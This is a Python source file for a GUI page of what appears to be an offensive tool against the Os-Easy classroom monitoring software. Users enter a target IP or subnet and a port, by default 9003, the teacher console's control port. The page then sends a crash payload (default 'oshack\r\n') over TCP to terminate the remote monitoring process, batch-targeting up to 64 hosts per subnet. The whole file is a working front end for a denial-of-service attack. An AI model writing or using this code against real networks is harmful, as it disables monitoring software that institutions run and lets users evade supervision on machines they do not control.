# src/gui/pages/page_crash.py
# 远程崩溃页 —— 按 IP/网段发送崩溃载荷，触发远端 Os-Easy 进程终止
# 使用 Winsock 建立 TCP 连接并发送 payload，触发远端进程崩溃/终止。

import flet as ft

from src.modules.remote_crasher import crash, crash_targets, expand_cidr, parse_payload, DEFAULT_PORT


class PageCrash:

    def __init__(self, ui):
        self.ui = ui

    # ---------------- 远程崩溃 ----------------
    def _do_crash(self, e):
        ui = self.ui
        ip = self.ip_input.value.strip()
        if not ip:
            ui.show_snakemessage("请先填写目标 IP/网段")
            return
        try:
            port = int(self.port_input.value.strip() or DEFAULT_PORT)
        except ValueError:
            ui.show_snakemessage("端口必须是数字")
            return
        payload = parse_payload(self.payload_input.value)

        def _run():
            # 若填的是网段，批量崩溃前 N 台
            if "/" in ip:
                hosts = expand_cidr(ip)
                result = crash_targets(hosts[:64], port, payload)
            else:
                result = crash(ip, port, payload)
            self.result_text.value = result
            ui.page.update()

        # 网络操作放到后台线程，避免阻塞 UI
        ui._run_in_thread(_run, "远程崩溃")
        self.result_text.value = f"正在向 {ip}:{port} 发送崩溃指令..."
        ui.page.update()

    # ---------------- 页面 ----------------
    def build(self):
        ui = self.ui

        self.ip_input = ft.TextField(
            label="目标 IP/网段", value="",
            expand=3, hint_text="如 192.168.1.100 或 192.168.1.0/24",
        )
        self.port_input = ft.TextField(
            label="端口", value=str(DEFAULT_PORT),
            expand=2, hint_text="默认 9003（教师端主控制口）",
        )
        self.payload_input = ft.TextField(
            label="载荷（可选）", value=r"oshack\r\n",
            expand=True,
            hint_text="留空用默认；支持 \\r \\n \\xNN 转义",
        )
        self.result_text = ft.Text("", size=13, selectable=True)

        return ft.Column(controls=[
            ui.yiyanshowtext, ft.Divider(height=1),
            ft.Text("远程功能", size=18, weight=ft.FontWeight.BOLD),
            ft.Text("向目标 IP 发送崩溃载荷，触发远端监控进程终止。",
                    size=13),
            ft.Row([self.ip_input, self.port_input], expand=True),
            self.payload_input,
            ft.FilledTonalButton(
                text="发送崩溃指令", icon=ft.Icons.SEND,
                on_click=self._do_crash,
                tooltip="向目标 IP/网段 发送崩溃载荷",
            ),
            self.result_text,
        ])
